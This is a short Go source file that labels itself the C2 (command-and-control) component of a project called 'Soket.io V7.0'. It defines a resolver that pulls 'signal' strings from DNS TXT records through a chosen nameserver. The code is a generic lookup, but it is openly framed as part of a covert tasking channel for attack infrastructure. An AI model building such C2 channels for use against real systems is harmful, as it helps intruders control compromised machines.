// Project: Soket.io V7.0
// Module: C2 Component
// Description:  C2 Infrastructure component.

package dns_txt

import (
	"context"
	"fmt"
	"net"
	"strings"
)

// Resolver handles DNS TXT record lookups for signaling data.
type Resolver struct {
	Nameserver string
}

// NewResolver initializes a DNS TXT resolver.
func NewResolver(ns string) *Resolver {
	return &Resolver{Nameserver: ns}
}

// LookupSignal retrieves and decodes a signal from a domain's TXT records.
func (r *Resolver) LookupSignal(ctx context.Context, domain string) (string, error) {
	resolver := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{}
			return d.DialContext(ctx, "udp", r.Nameserver)
		},
	}

	txts, err := resolver.LookupTXT(ctx, domain)
	if err != nil {
		return "", err
	}

	// Join multiple TXT records if split (standard behavior for long signals)
	var signal strings.Builder
	for _, txt := range txts {
		signal.WriteString(txt)
	}

	if signal.Len() == 0 {
		return "", fmt.Errorf("no signal found in TXT records for %s", domain)
	}

	return signal.String(), nil
}
